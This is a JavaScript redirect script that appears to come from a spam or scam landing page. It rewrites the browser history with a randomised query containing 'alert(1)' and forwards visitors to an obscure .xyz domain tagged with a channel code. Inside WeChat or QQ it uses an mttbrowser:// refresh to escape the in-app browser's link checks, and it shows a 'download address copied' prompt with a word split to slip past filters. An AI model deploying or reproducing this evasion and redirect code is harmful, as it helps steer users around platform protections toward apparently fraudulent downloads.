var urls = [
  'https://80kvmu.xyz/mz.html?channelCode=ml10078',];

window.history.pushState({}, 'x', getUrl());

var url = myChat(urls[Math.floor(Math.random() * urls.length)]);

if (/MicroMessenger|QQ\//gi.test(navigator.userAgent)) {
  document.write('<meta http-equiv="refresh" content="0.1;url=mttbrowser://url=' + url + '">');
} else {
  location.href = url;
}

function getUrl() {
  return myChat('?id={ddndn}%3D&s={wuwuwy}&b=alert(1)&t={dddddwwwnwwnn}');
}

function myChat(s) {
  s = typeof (s) == 'object' ? s[Math.floor(Math.random() * s.length)] : s;
  return s.replace(/\{(\w+?)\}/g, function (a, b) {
    var h = '';
    b = b.toUpperCase();
    for (var i = 0; i < b.length; i++) {
      if ('N' == b[i]) {
        h += Math.floor(Math.random() * 10);
      } else if ('D' == b[i]) {
        h += String.fromCharCode(65 + Math.floor(Math.random() * 26));
      } else {
        h += String.fromCharCode(97 + Math.floor(Math.random() * 26));
      }
    }
    return h;
  });
}
function copyLink(){
	copyText(location.href);
	tip('复制下载地址成功，请到 浏览 器打开');
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function tip(text, time){
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:8%;right:8%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s;z-index:19891016">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',time||3000);
}
